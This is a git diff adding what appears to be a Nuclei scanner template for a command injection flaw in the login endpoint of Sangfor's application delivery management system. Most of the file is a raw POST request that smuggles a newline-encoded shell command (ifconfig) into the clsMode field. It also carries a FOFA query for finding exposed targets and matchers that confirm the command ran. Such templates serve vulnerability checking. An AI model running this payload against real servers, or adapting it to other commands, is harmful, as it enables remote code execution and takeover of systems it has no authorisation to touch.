@@ -1,0 +1,34 @@
+id: login
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: 深信服应用交付管理系统login存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "深信服应用交付管理系统"
+http:
+  - raw:
+      - |
+        POST /rep/login  HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset-UTF-8
+        X-Requested-With: XMLHttpRequest
+        Referer: {{BaseURL}}/rep/login
+        Connection: close
+
+        clsMode=cls_mode_login%0Aifconfig%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Link"
